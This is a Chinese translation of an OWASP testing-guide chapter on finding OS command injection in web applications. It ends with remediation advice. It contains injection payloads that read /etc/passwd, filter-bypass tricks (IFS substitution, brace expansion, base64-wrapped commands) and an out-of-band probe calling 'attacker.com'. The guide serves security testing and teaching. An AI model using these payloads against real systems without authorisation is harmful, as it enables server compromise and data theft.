# 测试命令注入

|ID          |
|------------|
|WSTG-INPV-12|

## 概述

本文介绍如何测试应用程序是否存在操作系统命令注入漏洞。测试人员将通过 HTTP 请求向应用程序注入操作系统命令。

操作系统命令注入是一种漏洞，当用户输入未经过适当验证或清理而直接传递给操作系统命令时会发生。这允许用户在服务器上注入并执行任意命令，可能导致未授权数据访问、数据损坏和服务器完全失陷。通过在应用程序设计和开发过程中强调安全性，可以预防此漏洞。

## 测试目标

- 识别并评估命令注入点。
- 绕过特殊字符和操作系统命令过滤器。

## 如何测试

当在 Web 应用程序中查看文件时，文件名通常显示在 URL 中。Perl 允许将进程中的数据通过管道传递给 open 语句。用户只需在文件名末尾附加管道符号 `|`。

修改前的 URL 示例：

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt`

修改后的 URL 示例：

`https://sensitive/cgi-bin/userData.pl?doc=user1.txt|/bin/ls`

这将执行命令 `/bin/ls`。

在 .PHP 页面的 URL 末尾附加分号，后跟操作系统命令，将执行该命令。`%3B` 是 URL 编码，解码后为分号。

示例：

`https://sensitive/something.php?dir=%3Bcat%20/etc/passwd`

## 命令注入的特殊字符

特殊字符用于将多个命令链接在一起。这些字符将根据 Web 服务器上运行的操作系统而有所不同。
例如，以下类型的命令链接可以在 Windows 和基于 Unix 的系统上使用：

- `cmd1|cmd2`：无论 cmd1 是否成功，cmd2 都将执行。
- `cmd1||cmd2`：仅当 cmd1 失败时，cmd2 才会执行。
- `cmd1&&cmd2`：仅当 cmd1 成功时，cmd2 才会执行。
- `cmd1&cmd2`：无论 cmd1 是否成功，cmd2 都将执行。

请注意，`;` 在基于 Unix 的系统以及 PowerShell 上有效。然而，在 Windows 命令提示符（CMD）上不起作用。
此外，您可以在基于 Unix 的系统上使用 Bash 命令替换 `$(cmd)` 或 `` `cmd` `` 来执行命令。
另外，Linux 文件描述符如 `>(cmd)`、`<(cmd)` 也可使用。

## 其他命令注入技术

攻击者可能会根据环境和过滤机制，利用不同的技术执行操作系统命令。

### 命令替换

命令替换允许将一个命令的输出用作另一个命令的输入。

示例：

```bash
$(whoami)
`whoami`
```

### 命令链

使用命令链运算符可以按顺序执行多个命令。

示例：

```bash
cmd1 ; cmd2
cmd1 && cmd2
cmd1 || cmd2
```

### 文件重定向

攻击者可能会将命令输出重定向到 Web 服务器可访问的文件中。

示例：

```bash
whoami > /var/www/html/output.txt
```

### 带外命令注入

攻击者可能会使用外部服务来检测命令执行。

示例：

```bash
curl http://attacker.com
nslookup attacker.com
```

## 过滤器绕过

为了防止操作系统命令注入，Web 开发人员经常使用过滤器。然而，这些过滤器有时未正确实现，使得攻击者能够绕过它们。
在本节中，我们将介绍用于绕过这些过滤器的不同技术。

### 方法

首先，在尝试绕过过滤器之前，对过滤器的工作原理有基本了解始终是良好实践。
以下是我们遇到过滤器时可以使用的通用方法：

- 过滤器是客户端还是服务器端？
- 过滤器是应用于特殊字符、操作系统命令，还是两者都有？
- Web 应用使用的是白名单还是黑名单过滤器？
- Web 服务器运行的是什么操作系统？这让我们了解可以使用的命令和特殊字符。

### 特殊字符过滤器绕过

如前所述，过滤器可以应用于特殊字符、操作系统命令或两者。
要绕过应用于特殊字符的过滤器，我们可以使用环境变量、Bash 花括号扩展或 URL 编码。

#### URL 编码

如果 Web 服务器仅阻止明文特殊字符，则对特殊字符进行 URL 编码可以让我们绕过过滤器。
以下是一些特殊字符及其 URL 编码格式：

|特殊字符|URL 编码|
|-----------------|------------|
|;                | %3b        |
|空格             | %20        |
|制表符           | %09        |
|&                | %26        |
|换行             | %0a        |

例如，我们可以使用 `%3bwhoami` 代替 `;whoami`。

#### 环境变量

空格、分号、制表符或换行符等特殊字符通常会被 Web 服务器过滤，尤其是当它们对指定输入无用时。
为了绕过此限制，我们可以使用环境变量，例如 Linux 上的 **IFS**、**PATH** 或 **LS_COLORS**，以及 Windows 上的 **HOMEPATH**。
例如，在 Linux 上，`/`、`;` 和 `[space]` 可以分别替换为 `${PATH:0:1}`、`${LS_COLORS:10:1}` 和 `${IFS}`。
在 Windows CMD 上，我们可以用 `%HOMEPATH:~6,1%` 替换 `\`，或在 PowerShell 中使用 `$env:HOMEPATH[0]`。

#### Bash 花括号扩展

Bash 花括号扩展是 Bash 的一个特性，允许您使用花括号执行命令。
例如，`{ls,-la}` 将执行 `ls -la` 命令。如果 Web 服务器过滤空格、换行或制表符，这将非常有用。
假设我们要显示 '/etc/passwd' 文件的内容。那么，我们可以使用 `;{cat,/etc/passwd}` 代替 `;cat /etc/passwd`。
也就是说，需要注意的是，此技术仅在 Web 服务器使用 Bash 且 `}{/,;` 等字符未被过滤时才有效。

### 命令过滤器绕过

在本节中，我们将探讨一些用于绕过应用于操作系统命令的过滤器的技术。

#### 大小写修改

大小写修改是一种用于绕过操作系统命令过滤器的技术。如果服务器端过滤器区分大小写，这将很有帮助。
例如，如果在测试过程中，我们注意到 Web 服务器阻止了 `;whoami`，我们可以尝试使用 `;WhoAmi`，并发现服务器端过滤器仅阻止小写命令，那么我们就能绕过它。
请注意，此技术通常适用于 Windows 系统。
在 Linux 上，我们将使用一种称为**字符移位**的技术。例如，以下命令将每个大写字符转换为对应的小写字符。

```bash
;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")
```

#### 字符插入

`\`、`$@`、`'` 等字符可以插入 Linux 操作系统命令中，而不影响命令的正常执行。
例如，`who\ami`、`w$@hoami` 或 `wh'o'ami` 都将执行 `whoami` 命令。

请注意，Linux 命令中的单引号 `'` 数量必须是**偶数**，否则会出现错误。如果您使用 Windows CMD，请确保使用双引号 `"`。
此外，您还可以在 CMD 命令中使用插入符 `^`。例如，`whoa^mi` 将执行 `whoami` 命令。这在 PowerShell 中不起作用。

#### Base64 编码

在某些情况下，Web 服务器可能会过滤 `whoami`、`id` 等命令。
假设 `whoami` 被 Web 服务器阻止。因此，我们不能使用像 `;whoami` 这样的载荷。
为了绕过此限制，我们将使用 `whoami` 的 base64 编码格式，执行：`echo -n 'whoami' | base64`。这将返回 `d2hvYW1p`。
之后，我们将以下载荷发送到易受攻击的参数中：`;bash<<<$(base64 -d<<< d2hvYW1p)`。这应能绕过服务器端过滤器，并允许我们实现远程命令执行。

**最后，请注意，您可能需要结合不同的特殊字符和操作系统命令过滤器绕过技术，才能成功绕过 Web 服务器设置的各种过滤器。**

## 盲命令注入

有时，我们可能无法在 Web 服务器的 HTTP 响应中看到注入命令的输出。因此，我们需要找到一种方法来确认注入是否成功。为此，我们可以使用我们控制下的 `HTTP`、`DNS` 或 `SMTP` 远程服务器。
我们还可以使用**时间延迟系统命令**，如 `sleep`（Linux）、`timeout`（Windows）或 `ping` 等网络工具。
例如，我们可以执行 `;sleep(5)`，如果 Web 服务器在发回响应之前等待了 5 秒，我们可以确认它存在盲命令注入漏洞。
此外，我们还可以**将注入命令的输出重定向到 Web 服务器的 Web 根目录**。`;whoami>/var/www/html/poc.txt;`
之后，我们可以执行 `curl http://website.com/poc.txt`。如果能够检索到该文件，则可以确认 Web 服务器存在盲命令注入漏洞。

## 危险的命令执行 API

以下不同编程语言中的 API 可以执行操作系统命令，如果在未清理用户输入的情况下使用，可能会引入命令注入漏洞。

| 语言 | 危险 API |
|---------|---------------|
| Java | `Runtime.exec()` |
| C/C++ | `system()`、`exec()`、`ShellExecute()` |
| Python | `exec()`、`eval()`、`os.system()`、`os.popen()`、`subprocess.Popen()`、`subprocess.call()` |
| PHP | `system()`、`shell_exec()`、`exec()`、`proc_open()`、`eval()`、`passthru()` |
| Node.js | `child_process.exec()`、`execSync()`、`spawn()` |
| Ruby | `system()`、`exec()`、`Open3.popen3()` |
| Go | `exec.Command()` |
| C# | `Process.Start()` |

## 修复

### 清理

需要对 URL 查询参数和表单数据进行验证和清理，以防止注入恶意字符。
使用字符黑名单是一种选择，但可能难以全面考虑所有需要验证的字符，而且可能还有尚未发现的威胁。
应创建一个仅包含授权字符或命令的白名单来验证用户输入。此列表应消除遗漏的字符以及未发现的威胁。

命令注入的一般性黑名单可包括：`|` `;` `&` `$` `>` `<` `'` `\` `!` `>>` `#`

转义或过滤 Windows 特殊字符：`(` `)` `<` `>` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `^` `~` `!` `.` `"` `%` `@` `/` `\` `:` `+` `,` `` ` ``

转义或过滤 Linux 特殊字符：`{` `}` `(` `)` `>` `<` `&` `*` `‘` `|` `=` `?` `;` `[` `]` `$` `–` `#` `~` `!` `.` `"` `%` `/` `\` `:` `+` `,` `` ` ``

此外，除非绝对必要，请避免在应用程序中使用执行操作系统命令的函数。例如，复制文件时，您可以直接使用 PHP 内置函数 `copy("/path/to/file1.txt", "/path/to/file2.txt")`，它完成相同的操作，而不使用 `system("cp /path/to/file1.txt /path/to/file2.txt")`。值得注意的是，其他开发语言/框架通常也提供类似的内置功能。

### 权限

Web 应用程序及其组件应在严格权限下运行，不允许执行操作系统命令。从灰盒测试的角度，尝试验证所有这些信息。
